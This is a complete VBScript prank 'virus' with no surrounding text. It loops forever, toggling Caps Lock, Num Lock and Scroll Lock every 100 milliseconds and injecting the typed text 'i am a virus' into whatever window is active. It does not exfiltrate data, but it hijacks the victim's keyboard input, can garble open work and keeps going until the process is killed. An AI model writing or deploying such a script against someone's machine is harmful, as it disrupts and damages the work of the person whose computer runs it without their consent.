set x=wscript.createobject ("wscript.shell")
do
wscript.sleep 100
x.sendkeys "{CAPSLOCK}"
x.sendkeys "{NUMLOCK}"
x.sendkeys "i am a virus"
x.sendkeys "{SCROLLLOCK}"
loop